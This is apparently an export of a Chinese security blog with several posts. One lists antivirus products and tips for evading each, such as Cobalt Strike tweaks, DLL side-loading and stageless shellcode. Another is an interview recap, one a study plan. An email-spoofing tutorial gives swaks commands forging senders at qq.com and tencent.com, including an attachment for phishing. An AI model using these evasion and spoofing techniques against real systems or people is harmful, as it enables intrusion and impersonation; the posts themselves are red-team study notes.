<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">╰─# grep &#x27;Time Zone&#x27; *.txt    </span><br><span class="line">4.txt:Time Zone:                 (UTC-08:00) Pacific Time (US &amp; Canada)</span><br><span class="line">5.txt:Time Zone:                 (UTC+01:00) Amsterdam, Berlin, Bern, Rome, Stockholm, Vienna</span><br><span class="line">6.txt:Time Zone:                 (UTC-05:00) Eastern Time (US &amp; Canada)</span><br><span class="line">7.txt:Time Zone:                 (UTC+02:00) Athens, Bucharest</span><br><span class="line">8.txt:Time Zone:                 (UTC) Co-ordinated Universal Time</span><br><span class="line">9.txt:Time Zone:                 (UTC) Co-ordinated Universal Time</span><br></pre></td></tr></table></figure>

<p>系统制作厂商和型号，部分沙箱的制作厂商为QEMU</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">╰─# grep &#x27;System Manufacturer&#x27; *.txt</span><br><span class="line">4.txt:System Manufacturer:       DELL</span><br><span class="line">5.txt:System Manufacturer:       Dell Inc.</span><br><span class="line">6.txt:System Manufacturer:       ASUS</span><br><span class="line">7.txt:System Manufacturer:       SAMSUNG</span><br><span class="line">8.txt:System Manufacturer:       QEMU</span><br><span class="line">9.txt:System Manufacturer:       QEMU</span><br><span class="line"></span><br><span class="line">╰─# grep &#x27;System Model&#x27; *.txt       </span><br><span class="line">4.txt:System Model:              Standard PC (i440FX + PIIX, 1996)</span><br><span class="line">5.txt:System Model:              OptiPlex 7010</span><br><span class="line">6.txt:System Model:              P5E-VM DO</span><br><span class="line">7.txt:System Model:              670Z5E</span><br><span class="line">8.txt:System Model:              Standard PC (i440FX + PIIX, 1996)</span><br><span class="line">9.txt:System Model:              Standard PC (i440FX + PIIX, 1996)</span><br></pre></td></tr></table></figure>





<h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><h3 id="1-HW中遇到的杀软"><a href="#1-HW中遇到的杀软" class="headerlink" title="1.HW中遇到的杀软"></a>1.HW中遇到的杀软</h3><ul>
<li>windows defender</li>
<li>360全家桶</li>
<li>火绒</li>
<li>QQ管家</li>
<li>阿里安骑士</li>
<li>sangfor edr</li>
<li>G01</li>
<li>趋势科技</li>
<li>麦咖啡 卡巴斯基</li>
</ul>
<h3 id="2-杀软分组"><a href="#2-杀软分组" class="headerlink" title="2.杀软分组"></a>2.杀软分组</h3><h5 id="静态对抗组（上线就可以乱搞）"><a href="#静态对抗组（上线就可以乱搞）" class="headerlink" title="静态对抗组（上线就可以乱搞）"></a>静态对抗组（上线就可以乱搞）</h5><ul>
<li>sangfor edr</li>
<li>麦咖啡</li>
<li>阿里安骑士</li>
<li>趋势科技</li>
<li>QQ管家</li>
<li>G01</li>
</ul>
<h5 id="行为对抗组（上线了还必须注意操作）"><a href="#行为对抗组（上线了还必须注意操作）" class="headerlink" title="行为对抗组（上线了还必须注意操作）"></a>行为对抗组（上线了还必须注意操作）</h5><ul>
<li>windows defender</li>
<li>360全家桶</li>
<li>卡巴斯基</li>
<li>eset</li>
<li>火绒</li>
</ul>
<h3 id="3-静态对抗组"><a href="#3-静态对抗组" class="headerlink" title="3.静态对抗组"></a>3.静态对抗组</h3><ul>
<li>sangfor edr：    静态查杀很强，不会查杀父进程，过了静态就可以乱来</li>
<li>麦咖啡：  麦咖啡静态查杀也很强，没有行为查杀</li>
<li>阿里安骑士：静态一般，但<strong>拦截高危cmd操作</strong></li>
<li>趋势科技：<strong>监控恶意服务创建</strong>，行为检测基本无</li>
<li>QQ管家：？</li>
<li>G01：静态上传不管是exe还是dll都会被杀，有黑名单机制</li>
</ul>
<p><font color="RedOrange"><strong>tips：将程序后缀改为txt，可以在cmd下直接运行（cmd 会将任意内容开头为MZ的文件当作PE可执行文件尝试允许）</strong></font></p>
<h3 id="4-行为对抗组"><a href="#4-行为对抗组" class="headerlink" title="4.行为对抗组"></a>4.行为对抗组</h3><h4 id="1-eset"><a href="#1-eset" class="headerlink" title="1.eset"></a><font color="Bittersweet">1.eset</font></h4><ul>
<li><font color="Bittersweet">上线方面</font></li>
</ul>
<p><font color="Bittersweet">loader使用shellcode分离的方式</font></p>
<ul>
<li><font color="Bittersweet">操作方面</font></li>
</ul>
<p><font color="Bittersweet">不是企业版没碰到有拦截一些常规操作</font></p>
<h4 id="2-卡巴斯基"><a href="#2-卡巴斯基" class="headerlink" title="2.卡巴斯基"></a><font color="Salmon">2.卡巴斯基</font></h4><p><font color="Salmon">内存扫描能力很强，默认的cs beacon会被检测</font></p>
<ul>
<li><font color="Salmon">上线方面</font></li>
</ul>
<p><font color="Salmon">修改cs的profile(可参考：<a href="https://xz.aliyun.com/t/9224">https://xz.aliyun.com/t/9224</a>)</font></p>
<ul>
<li><font color="Salmon">操作方面</font></li>
</ul>
<p><font color="Salmon">常规操作是不拦截的</font></p>
<h4 id="3-火绒"><a href="#3-火绒" class="headerlink" title="3.火绒"></a><font color="Peach">3.火绒</font></h4><ul>
<li><font color="Peach">上线方面</font></li>
</ul>
<p><font color="Peach">没啥注意</font></p>
<ul>
<li><font color="Peach">操作方面</font></li>
</ul>
<p><font color="Peach">不要去做一些乱搞的配置，很容易绕过，不要随意使用提权工具</font></p>
<p><font color="Peach">心跳不要过短</font></p>
<h4 id="4-360"><a href="#4-360" class="headerlink" title="4.360"></a><font color="BrickRed">4.360</font></h4><ul>
<li><font color="BrickRed">360核心防护</font></li>
</ul>
<p><font color="BrickRed">开启了核晶防护之后，需要操作是受限的，大部分的CMD命令是无法使用的，判断是否开启核晶防护，上传EXE执行提升拒绝访问，就算上线了，becaon下运行cmd命令提示拒绝访问</font></p>
<ul>
<li><font color="BrickRed">上线方面</font></li>
</ul>
<p><font color="BrickRed">如果有核晶防护，DLL白加黑解决上线问题（项目推荐：<a href="https://github.com/marpie/signed-loaders%EF%BC%89%EF%BC%8C%E9%81%BF%E5%85%8D%E4%BD%BF%E7%94%A8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E7%9A%84%E6%96%B9%E5%BC%8F%E5%8A%A0%E8%BD%BDshellcode">https://github.com/marpie/signed-loaders），避免使用进程注入的方式加载shellcode</a></font></p>
<ul>
<li><font color="BrickRed">操作方面</font></li>
</ul>
<p><font color="BrickRed">即便有system权限也没办法实现CMD命令注入，就上传我们自己写好的代码进行注入，或者用bof插件进行相关的替代</font></p>
<h4 id="5-windows-defender"><a href="#5-windows-defender" class="headerlink" title=" 5.windows defender"></a><font color="each"> 5.windows defender</font></h4><ul>
<li><font color="each">上线方面</font></li>
</ul>
<p><font color="each">针对cs,不要使用stager shellcode ，使用stage shellcode 上线是要立刻被干掉的，用stageless的shellcode。</font></p>
<ul>
<li><font color="each">操作方面</font></li>
</ul>
<p><font color="each">如果出发恶意行为，如提权之类的，会关联到loader程序，上线后可以注入到另外的进程去操作，<br>使用cs内置的execute-assembly 可能会导致beacon掉线，原因：C#的程序本身是不免杀的，会经过ASMI的扫描</font></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="本地引擎-amp-云引擎"><a href="#本地引擎-amp-云引擎" class="headerlink" title="本地引擎&amp;云引擎"></a>本地引擎&amp;云引擎</h3><p>目前，国内软件大多数都是采用OEM引擎(自研本地引擎)+云引擎，以云引擎为主，OEM引擎为辅。因为本地引擎需要投入的成本太大，包括但不限于启发式扫描、虚拟沙盒在内的核心技术存在较高技术门槛。而对于云引擎，只需要解决样本采集和云端样本自动分析平台即可。</p>
<p>云引擎由于可以实时同步云端的计算结果，所以实时性较高。但由于网络带宽的限制，在有限的扫描时间内,云引擎只能在本地提取高度抽象的数据特征发送到云端进行匹配,所以一般云引擎会选择哈希类特征(通常是全文哈希)。而哈希类特征的检出能力与样本基本是1:1的关系，即一条哈希特征通常只能检出一个样本，所以恶意代码的快速迭代对云端的样本收集能力、分析处理能力以及云端平台的运营成本来说，都是不小的挑战。</p>
<p>而对于本地引擎,引擎本身技术能力的发展可以放大特征与样本之间的比例,即用少量的特征检出更多的样本。</p>
<p>且引擎抗干扰能力越强,给恶意代码制造者进行免杀设定的技术门槛越高,相应的有效检出时效越长。</p>
<p>另外,本地弓|擎的核心技术可以被应用于云端自动分析平台,所以本地引擎技术的发展对云端的计算结果也有着积极的促进作用。</p>
<h3 id="统计引擎（启发式引擎）"><a href="#统计引擎（启发式引擎）" class="headerlink" title="统计引擎（启发式引擎）"></a>统计引擎（启发式引擎）</h3><p>这些引擎本质上都是基于统计学算法,通过对海量样本以固定方法抽取特征,并对特征进行统计、分析，进而产生计算模型。依照计算模型对待扫描样本进行分类，进而推测样本是否属于恶意分类。</p>
<p>感觉这类启发式引擎和机器学习很相似，但是要注意一点，归根结底还是对特征的统计、分析、扫描。</p>
<p><img src="/2022/03/31/%E6%B5%85%E6%9E%90%E6%9D%80%E8%BD%AF/image-20220119113611084.png" alt="image-20220119113611084"></p>
<p><img src="/2022/03/31/%E6%B5%85%E6%9E%90%E6%9D%80%E8%BD%AF/image-20220119113619125.png" alt="image-20220119113619125"></p>
]]></content>
      <categories>
        <category>免杀</category>
      </categories>
      <tags>
        <tag>原理</tag>
        <tag>杀软</tag>
      </tags>
  </entry>
  <entry>
    <title>某盟安服校招面试题</title>
    <url>/2021/09/10/%E6%9F%90%E7%9B%9F%E6%A0%A1%E6%8B%9B%E9%9D%A2%E8%AF%95%E9%A2%98/</url>
    <content><![CDATA[<h3 id="9-2-视频一面"><a href="#9-2-视频一面" class="headerlink" title="9.2 视频一面"></a>9.2 视频一面</h3><p>一面还是很简单的，没有问什么技术方面的东西</p>
<p>1.介绍一下自己的学校、专业情况、学校成绩、排名这些</p>
<p>2.学习安全多长时间了</p>
<p>3.现在的学习方向</p>
<p>4.说说你对未来的规划</p>
<p>5.在校期间有没有打过ctf 挖过src</p>
<p>6.说说你的项目经历</p>
<p>7.说说你的实习经历</p>
<p>8.为什么选择绿盟这家公司</p>
<p>9.拿到一个站点的渗透思路</p>
<p>大概就这些，正常回答就好了。</p>
<h3 id="9-6-电话二面"><a href="#9-6-电话二面" class="headerlink" title="9.6 电话二面"></a>9.6 电话二面</h3><p>二面来面的技术，面了半个多小时，中间面试官还遭遇了Ddos（有点离谱）</p>
<p>1.自我介绍  和一面不同的是，这里主要介绍自己会的东西，研究方向</p>
<p>2.学习安全是自学还是报班学</p>
<p>3.有没得打过ctf 和挖过src</p>
<p>4.有没有运维经验（这里因为我简历上写了熟悉Windows和Linux的运维，翻车了，也面试过好几次了，但也从来没问过运维 哈哈哈，已经把简历改过来啦）</p>
<p>5.基础的web漏洞原理，sql注入的分类，存在点，怎么判断，怎么利用，遇到了waf怎么绕过</p>
<p>6.xss问的比较多，分类，三种xss不同的区别，存在的位置，怎么绕过waf （后来才知道绿盟的扫描器大部分都是扫出来的xss，哈哈哈，怪不得问这么多xss）</p>
<p>7.对逻辑漏洞了解多少，遇到一个有验证码的登录框，存在找回密码功能，你有什么想法</p>
<p>8.http 数据包的结构</p>
<p>9.文件上传的绕过思路，绕过waf</p>
<p>10.谈谈你的项目经历</p>
<p>11.你印象最深的渗透经历是哪次</p>
<p>12.会什么语言，写过什么东西</p>
<p>13.Java安全了解吗（这里我直接说了对Java安全不了解，不然后续应该会问）shiro 、fastjson、weblogic反序列化的原理，还问了你碰到shiro 、weblogic这类站点怎么处理（我直接exp 哈哈哈）</p>
<p>14.渗透过程中常见的端口号以及对应的服务</p>
<p>15.内网渗透经历，详细说下过程，渗透思路</p>
<p>16.拿到webshell发现目标主机不出网怎么办</p>
<p>17.有没有复现过一些漏洞</p>
<p>18.会不会关注最新的安全资讯</p>
<p>19.说一下通配符注入</p>
<p>20.内网中横向的常用方法</p>
<p>21.说一下你是怎么做免杀的（我刚说完无源码的免杀，就问我下一个问题了……我都还没说完……）</p>
<p>22.对域前置技术了解多少</p>
<p>23.目前的研究方向，未来的研究方向，规划</p>
<p>24.有没有代码审计能力</p>
<p>25.怎么找越权漏洞，常见的参数</p>
<p>emmm，大概就这些吧，暂时想起来了这么多，后面想起来了再补充。</p>
<h2 id="9-10结果"><a href="#9-10结果" class="headerlink" title="9.10结果"></a>9.10结果</h2><p>我是废物呜呜呜</p>
<p>安服岗被拒</p>
<p><img src="/2021/09/10/%E6%9F%90%E7%9B%9F%E6%A0%A1%E6%8B%9B%E9%9D%A2%E8%AF%95%E9%A2%98/image-20210910223809093.png" alt="image-20210910223809093"></p>
<p>但是我个人认为二面技术上问的问题都是过关的。。。被拒原因emmm，不合适吧哈哈哈(还是太菜了)</p>
<p>Peace.</p>
]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>浅析邮件伪造</title>
    <url>/2022/01/10/%E6%B5%85%E6%9E%90%E9%82%AE%E4%BB%B6%E4%BC%AA%E9%80%A0/</url>
    <content><![CDATA[<h2 id="SPF配置"><a href="#SPF配置" class="headerlink" title="SPF配置"></a>SPF配置</h2><p>spf全称为（Sender Policy Framework），即发件人策略框架</p>
<p>目前所进行的邮件通信，使用的是smtp协议（Simple Mail Transfer Protocol），即简单邮件传输协议。但是smtp是没有很好的安全措施的，一个简单的例子为：发件人的邮箱地址可以由发信方任意声明，即发件人邮箱伪造。</p>
<p>spf就是为了解决这个问题，spf的原理：</p>
<p>假设邮件服务器收到了一封邮件，发件人的IP为：192.6.6.6，并且声称发件人为 <a href="mailto:&#x65;&#x6d;&#x61;&#105;&#x6c;&#x40;&#x65;&#x78;&#97;&#x6d;&#112;&#108;&#101;&#x2e;&#99;&#111;&#109;">&#x65;&#x6d;&#x61;&#105;&#x6c;&#x40;&#x65;&#x78;&#97;&#x6d;&#112;&#108;&#101;&#x2e;&#99;&#111;&#109;</a>。为了确认发件人不是伪造的，邮件服务器会查询 <code>example.com</code>的spf记录。如果该域的spf记录设置允许IP为 192.6.6.6 主机发送邮件，则服务器认为这封邮件是合法的，否则，会退信（即收件人收不到邮件），或者邮件躺在垃圾箱。邮箱伪造可以声明他来自<code>example.com</code>，但是却无法操作 <code>example.com</code> 的 DNS解析记录，也无法伪造自己的IP地址，所以SPF还是可以有效防御邮件伪造的。</p>
<p>通俗的来讲，A 和 B 两个人建立通信，A向B发送信息，B 检查 A是不是在常用地(白名单)发的信息，如果不是，则拒收信息。</p>
<h2 id="SPF-记录的语法"><a href="#SPF-记录的语法" class="headerlink" title="SPF 记录的语法"></a>SPF 记录的语法</h2><p>一条 SPF 记录定义了一个或者多个 mechanism（机制），而 mechanism 则定义了哪些 IP 是允许的，哪些 IP 是拒绝的。</p>
<p>这些 mechanism 包括以下几类：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">all | ip4 | ip6 | a | mx | ptr | exists | include</span><br></pre></td></tr></table></figure>

<p>每个 mechanism 可以有四种前缀：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;+&quot;  Pass（通过）</span><br><span class="line">&quot;-&quot;  Fail（拒绝）</span><br><span class="line">&quot;~&quot;  Soft Fail（软拒绝）</span><br><span class="line">&quot;?&quot;  Neutral（中立）</span><br></pre></td></tr></table></figure>

<p>测试时，将从前往后依次测试每个 mechanism。如果一个 mechanism 包含了要查询的 IP 地址（称为命中），则测试结果由相应 mechanism 的前缀决定。默认的前缀为<code>+</code>。如果测试完所有的 mechanisms 也没有命中，则结果为 Neutral。</p>
<p>除了以上四种情况，还有 None（无结果）、PermError（永久错误）和 TempError（临时错误）三种其他情况。对于这些情况的解释和服务器通常的处理办法如下：</p>
<table>
<thead>
<tr>
<th>结果</th>
<th>含义</th>
<th>服务器处理办法</th>
</tr>
</thead>
<tbody><tr>
<td>Pass</td>
<td>发件 IP 是合法的</td>
<td>接受来信</td>
</tr>
<tr>
<td>Fail</td>
<td>发件 IP 是非法的</td>
<td>退信</td>
</tr>
<tr>
<td>Soft Fail</td>
<td>发件 IP 非法，但是不采取强硬措施</td>
<td>接受来信，但是做标记</td>
</tr>
<tr>
<td>Neutral</td>
<td>SPF 记录中没有关于发件 IP 是否合法的信息</td>
<td>接受来信</td>
</tr>
<tr>
<td>None</td>
<td>服务器没有设定 SPF 记录</td>
<td>接受来信</td>
</tr>
<tr>
<td>PermError</td>
<td>发生了严重错误（例如 SPF 记录语法错误）</td>
<td>没有规定</td>
</tr>
<tr>
<td>TempError</td>
<td>发生了临时错误（例如 DNS 查询失败）</td>
<td>接受或拒绝</td>
</tr>
</tbody></table>
<p>注意，上面所说的「服务器处理办法」仅仅是 SPF 标准做出的建议，实际测试中，并非所有的邮件服务器都严格遵循这套规定。还是要仔细看。</p>
<h3 id="Mechanisms-机制"><a href="#Mechanisms-机制" class="headerlink" title="Mechanisms(机制)"></a>Mechanisms(机制)</h3><p>下面介绍上面提到的 mechanism，mechanism 是规则，而上面说的服务器处理办法是服务器的返回值，简单来说，mechanism是因，服务器处理办法是果。</p>
<h4 id="all"><a href="#all" class="headerlink" title="all"></a>all</h4><p>表示所有 IP，肯定会命中。因此通常把它放在 SPF 记录的结尾，表示处理剩下的所有情况。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;v=spf1 -all&quot; 拒绝所有（表示这个域名不会发出邮件）</span><br><span class="line">&quot;v=spf1 +all&quot; 接受所有（域名所有者认为 SPF 是没有用的，或者根本不在乎它）</span><br></pre></td></tr></table></figure>

<h4 id="ip4"><a href="#ip4" class="headerlink" title="ip4"></a>ip4</h4><p>格式为<code>ip4:&lt;ip4-address&gt;</code>或者<code>ip4:&lt;ip4-network&gt;/&lt;prefix-length&gt;</code>，指定一个 IPv4 地址或者地址段。如果<code>prefix-length</code>没有给出，则默认为<code>/32</code>。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;v=spf1 ip4:192.168.0.1/16 -all&quot;</span><br><span class="line">只允许在 192.168.0.1 ~ 192.168.255.255 范围内的 IP</span><br></pre></td></tr></table></figure>

<h4 id="ip6"><a href="#ip6" class="headerlink" title="ip6"></a>ip6</h4><p>格式和<code>ip4</code>的很类似，默认的<code>prefix-length</code>是<code>/128</code>。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;v=spf1 ip6:1080::8:800:200C:417A/96 -all&quot;</span><br><span class="line">只允许在 1080::8:800:0000:0000 ~ 1080::8:800:FFFF:FFFF 范围内的 IP</span><br></pre></td></tr></table></figure>

<h4 id="a-和-mx"><a href="#a-和-mx" class="headerlink" title="a 和 mx"></a>a 和 mx</h4><p>这俩的格式是相同的，以<code>a</code>为例，格式为以下四种之一：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a</span><br><span class="line">a/&lt;prefix-length&gt;</span><br><span class="line">a:&lt;domain&gt;</span><br><span class="line">a:&lt;domain&gt;/&lt;prefix-length&gt;</span><br></pre></td></tr></table></figure>

<p>会命中相应域名的 a 记录（或 mx 记录）中包含的 IP 地址（或地址段）。如果没有提供域名，则使用当前域名。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;v=spf1 mx -all&quot;</span><br><span class="line">允许当前域名的 mx 记录对应的 IP 地址。</span><br><span class="line"></span><br><span class="line">&quot;v=spf1 mx mx:deferrals.example.com -all&quot;</span><br><span class="line">允许当前域名和 deferrals.example.com 的 mx 记录对应的 IP 地址。</span><br><span class="line"></span><br><span class="line">&quot;v=spf1 a/24 -all&quot;</span><br><span class="line">类似地，这个用法则允许一个地址段。</span><br></pre></td></tr></table></figure>

<p>例如，这是一个比较常见的 SPF 记录，它表示支持当前域名的 a 记录和 mx 记录，同时支持一个给定的 IP 地址；其他地址则拒绝：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v=spf1 a mx ip4:173.194.72.103 -all</span><br></pre></td></tr></table></figure>

<h4 id="include"><a href="#include" class="headerlink" title="include"></a>include</h4><p>格式为<code>include:&lt;domain&gt;</code>，表示引入<code>&lt;domain&gt;</code>域名下的 SPF 记录。注意，如果该域名下不存在 SPF 记录，则会导致一个<code>PermError</code>结果。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;v=spf1 include:example.com -all&quot; 即采用和 example.com 完全一样的 SPF 记录</span><br></pre></td></tr></table></figure>

<h4 id="exists"><a href="#exists" class="headerlink" title="exists"></a>exists</h4><p>格式为<code>exists:&lt;domain&gt;</code>。将对<code>&lt;domain&gt;</code>执行一个 A 查询，如果有返回结果（无论结果是什么），都会看作命中。</p>
<h4 id="ptr"><a href="#ptr" class="headerlink" title="ptr"></a>ptr</h4><p>格式为<code>ptr</code>或者<code>ptr:&lt;domain&gt;</code>。使用<code>ptr</code>机制会带来大量很大开销的 DNS 查询，所以连官方都不推荐使用它。</p>
<h3 id="关于v-spf1"><a href="#关于v-spf1" class="headerlink" title="关于v=spf1"></a>关于v=spf1</h3><p>这是必须的，表示采用 SPF 1 版本，现在它的最新版本就是第 1 版。</p>
<h3 id="Modifiers"><a href="#Modifiers" class="headerlink" title="Modifiers"></a>Modifiers</h3><p>SPF 记录中还可以包括两种可选的 modifier；一个 modifier 只能出现一次。</p>
<h4 id="redirect"><a href="#redirect" class="headerlink" title="redirect"></a>redirect</h4><p>格式为<code>redirect=&lt;domain&gt;</code></p>
<p>将用给定域名的 SPF 记录替换当前记录。</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>格式为<code>exp=&lt;domain&gt;</code>，目的是如果邮件被拒绝，可以给出一个消息。而消息的具体内容会首先对<code>&lt;domain&gt;</code>执行 TXT 查询，然后执行宏扩展得到。</p>
<p>查看目标服务器的spf配置信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dig +short TXT xxx.com</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/10/%E6%B5%85%E6%9E%90%E9%82%AE%E4%BB%B6%E4%BC%AA%E9%80%A0/image-20220109230845909.png" alt="image-20220109230845909"></p>
<p>根据上面的小知识，这里可以判断出：</p>
<p>使用的spf1版本的spf，include 后面 采用和 tencent.com  qq.com完全一样的spf记录，-all，硬拒绝</p>
<h2 id="swaks使用"><a href="#swaks使用" class="headerlink" title="swaks使用"></a>swaks使用</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">--from test@qq.com 				<span class="comment">//发件人邮箱；</span></span><br><span class="line"></span><br><span class="line">--ehlo qq.com 					<span class="comment">//伪造邮件ehlo头，即是发件人邮箱的域名。提供身份认证</span></span><br><span class="line"></span><br><span class="line">--body <span class="string">&quot;http://www.baidu.com&quot;</span> 	<span class="comment">//引号中的内容即为邮件正文；</span></span><br><span class="line"></span><br><span class="line">--header <span class="string">&quot;Subject:hello&quot;</span> 		<span class="comment">//邮件头信息，subject为邮件标题</span></span><br><span class="line"></span><br><span class="line">--data ./Desktop/email.txt 		<span class="comment">//将正常源邮件的内容保存成TXT文件，再作为正常邮件发送</span></span><br><span class="line">    </span><br><span class="line">--server mail.smtp2go.com -p <span class="number">2525</span> -au 用户名  -ap 密码  <span class="comment">//自己的邮箱服务器 </span></span><br></pre></td></tr></table></figure>



<p>最开始是拿自己的qq邮箱测试，但是收不到邮件，下面也指出了原因，因为qq.com作为发信域名设置了spf，这里导致伪造失败。</p>
<p><img src="/2022/01/10/%E6%B5%85%E6%9E%90%E9%82%AE%E4%BB%B6%E4%BC%AA%E9%80%A0/image-20220107152601144.png" alt="image-20220107152601144"></p>
<p><img src="/2022/01/10/%E6%B5%85%E6%9E%90%E9%82%AE%E4%BB%B6%E4%BC%AA%E9%80%A0/image-20220107152942708.png" alt="image-20220107152942708"></p>
<p>这是伪造的tencent.com</p>
<p><img src="/2022/01/10/%E6%B5%85%E6%9E%90%E9%82%AE%E4%BB%B6%E4%BC%AA%E9%80%A0/image-20220107155906940.png" alt="image-20220107155906940"></p>
<p>换了个邮箱，发信成功</p>
<p><img src="/2022/01/10/%E6%B5%85%E6%9E%90%E9%82%AE%E4%BB%B6%E4%BC%AA%E9%80%A0/image-20220107152504848.png" alt="image-20220107152504848"></p>
<p><img src="/2022/01/10/%E6%B5%85%E6%9E%90%E9%82%AE%E4%BB%B6%E4%BC%AA%E9%80%A0/image-20220107152442966.png" alt="image-20220107152442966"></p>
<p>关于swaks更高级的用法这里就不说了，网上都可以找到。</p>
<p>找到邮箱中的邮件，导出为eml文件，to后面改为目标邮箱</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">swaks --to xxx@qq.com --from campus@tencent.com --data test.eml --header &quot;Subject: 入职提醒&quot; </span><br></pre></td></tr></table></figure>



<p><img src="/2022/01/10/%E6%B5%85%E6%9E%90%E9%82%AE%E4%BB%B6%E4%BC%AA%E9%80%A0/image-20220109232631767.png" alt="image-20220109232631767"></p>
<p>可恶啊，还是失败了</p>
<p><img src="/2022/01/10/%E6%B5%85%E6%9E%90%E9%82%AE%E4%BB%B6%E4%BC%AA%E9%80%A0/image-20220109232956924.png" alt="image-20220109232956924"></p>
<h3 id="smtp2go"><a href="#smtp2go" class="headerlink" title="smtp2go"></a>smtp2go</h3><p>从evi1cg师傅那里看到的，smtp2go主要是相当于邮件托管，可以分发子账户进行发送。</p>
<p><a href="https://support.smtp2go.com/hc/en-gb">https://support.smtp2go.com/hc/en-gb</a></p>
<p>下文有提到，倾璇师傅利用python实现了工具化。</p>
<h3 id="去除Mailer特征"><a href="#去除Mailer特征" class="headerlink" title="去除Mailer特征"></a>去除Mailer特征</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">swaks --header-X-Mailer gmail.com --to payloads@aliyun.com --from xx@smtp2go.com --h-From: &#x27;管理员&lt;admin@qq.com&gt;&#x27; --ehlo gmail.com --body hello --server mail.smtp2go.com -p 2525 -au &lt;USER&gt; -ap &lt;PASSS&gt; </span><br></pre></td></tr></table></figure>



<h3 id="附件钓鱼"><a href="#附件钓鱼" class="headerlink" title="附件钓鱼"></a>附件钓鱼</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">swaks --header-X-Mailer gmail.com --to payloads@aliyun.com --from xx@smtp2go.com --h-From: &#x27;管理员&lt;admin@qq.com&gt;&#x27; --ehlo gmail.com --body hello --server mail.smtp2go.com -p 2525 -au &lt;USER&gt; -ap &lt;PASSS&gt; --attach /tmp/sss.rtf</span><br></pre></td></tr></table></figure>





<h2 id="脚本伪造"><a href="#脚本伪造" class="headerlink" title="脚本伪造"></a>脚本伪造</h2><p>是朋友根据倾璇师傅的脚本改的。倾璇师傅用的smtp2go，这里改了88邮箱。</p>
<p>在88邮箱开个smtp服务，利用88邮箱作为发件箱</p>
<p><img src="/2022/01/10/%E6%B5%85%E6%9E%90%E9%82%AE%E4%BB%B6%E4%BC%AA%E9%80%A0/image-20220109234851238.png" alt="image-20220109234851238"></p>
<p>看结果</p>
<p><img src="/2022/01/10/%E6%B5%85%E6%9E%90%E9%82%AE%E4%BB%B6%E4%BC%AA%E9%80%A0/image-20220912112041692.png" alt="image-20220912112041692"></p>
<p>因为不是源码不是我写的，没办法贴出来</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>swaks玩的好的话，配合钓鱼的手法，很容易可以撕开权限入口。钓鱼的手法多种多样，需要天马行空的想象，思路要骚，进入内网漫游一圈后，运气好的话，就不需要伪造发件人了嘿嘿。这篇文章只是浅析邮件伪造，更多关于smtp协议的知识我也没有深入去学习，暂时感觉还没有这个必要。</p>
<p>参考链接：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://payloads.online/archivers/2019-05-09/1/</span><br><span class="line">https://hex.moe/p/4878b295/</span><br><span class="line">https://blog.csdn.net/Alexz__/article/details/105564647</span><br><span class="line">https://www.cnblogs.com/backlion/p/10842676.html</span><br><span class="line">https://www.cnblogs.com/zhaijiahui/p/11494626.html</span><br></pre></td></tr></table></figure>

<p>Peace.</p>
]]></content>
      <categories>
        <category>钓鱼</category>
      </categories>
      <tags>
        <tag>钓鱼</tag>
        <tag>邮件伪造</tag>
      </tags>
  </entry>
  <entry>
    <title>短期规划以及学习中存在的问题</title>
    <url>/2021/12/03/%E7%9F%AD%E6%9C%9F%E8%A7%84%E5%88%92%E5%8F%8A%E5%8F%8D%E6%80%9D/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>有幸和漂亮鼠师傅聊了很多，感谢漂亮鼠师傅愿意花时间指导我。</p>
<p>最近搞的东西有些杂，因为在实习嘛，主要是针对移动端的测试，但对安卓逆向一窍不通的我，不学习点就很难搞下去，也没有打算一头钻到移动安全里，平时hw够用就可以的程度就可以。木马分析这块，emm，答应了别人要写，自己不学好怎么写出来给别人看，也不能落下。寒假本来打算把oscp考了，但我现在的水平不备考肯定是通过不了，需要付出的有点多emmmmm………………</p>
<p>本来只打算寒假把精力放在oscp和木马分析上，但是跟着公司打hw的话，能够逆向app的某个功能点，对渗透的帮助是很大的，所以前几天请教了下leader，也给我指点了方向。今天在群里emo了一上午，感谢几位师傅的指点。</p>
<p>综上: 得益于多位大佬师傅们的指点，对下一阶段的 todo_list 做一个规划。</p>
<h2 id="短期规划"><a href="#短期规划" class="headerlink" title="短期规划"></a>短期规划</h2><p>先罗列一下在计划中的技术栈</p>
<ul>
<li>安卓逆向</li>
<li>木马分析</li>
<li>OSCP证书                                                                                                             </li>
</ul>
<p>算了，本来列举了很多项，想来想去删掉了，太长期的计划写上没有意义，现在来看，对我来说，两个月以内的计划是比较合适的。可以完成很多东西，这样接着继续下一阶段的目标。</p>
